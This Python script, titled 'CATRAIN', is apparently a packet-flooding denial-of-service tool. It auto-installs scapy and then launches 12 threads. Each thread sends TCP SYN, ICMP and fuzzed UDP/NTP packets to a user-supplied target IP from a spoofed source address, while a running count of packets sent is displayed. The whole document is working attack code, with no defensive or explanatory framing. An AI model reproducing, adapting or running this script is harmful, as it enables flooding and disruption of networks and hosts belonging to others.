print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<") 

import subprocess as s; from threading import Thread; from time import sleep; from os import name as osname;

try:
	if b"scapy" not in s.check_output("pip list", shell=True):
		s.call("pip install scapy", shell=True) 
finally: 0 

target_ip = input("IP: ") 
count = int(input("Count: ")) 
srcIp = input("Source IP (opt): ") 
if not srcIp:
	srcIp = "192.168.2.34" 

rno = [True] * 12 
rcount = [0] * 12 

from scapy.all import IP, TCP, ICMP, UDP, NTP, send, fuzz 

def scr(number):
	packetT = IP(dst=target_ip, src=srcIp) / TCP(flags='S') 
	packetI = IP(dst=target_ip, src=srcIp) / ICMP() 
	packetU = IP(dst=target_ip, src=srcIp) / fuzz(UDP() / NTP()) 
	for i in range(count):
		send(packetT, verbose=0); send(packetI, verbose=0); send(packetU, verbose=0) 
		rcount[number] += 1 
	rno[number] = False 

threads = [] 
for x in range(12):
	t = Thread(target=scr, args=(x,)); t.start() 
	threads.append(t); print(f"called sub {x+1}") 

while any(rno):
	sleep(0.2) 
	if osname == "nt": s.call("cmd.exe /S /C cls", shell=True) 
	else: s.call("clear", shell=True) 
	status_lines = [] 
	status_lines.append("SUBP no.| Running\t| Packets sent\t| Packet run no.") 
	status_lines.append("¨" * 56) 
	for i in range(12): status_lines.append(f"{i+1}.\t| {rno[i]}\t\t| {str(rcount[i]*3).zfill(8)}\t| {str(rcount[i]).zfill(8)}") 
	print("\n".join(status_lines)) 
	sleep(0.3) 

input("\nAll sent~~") 

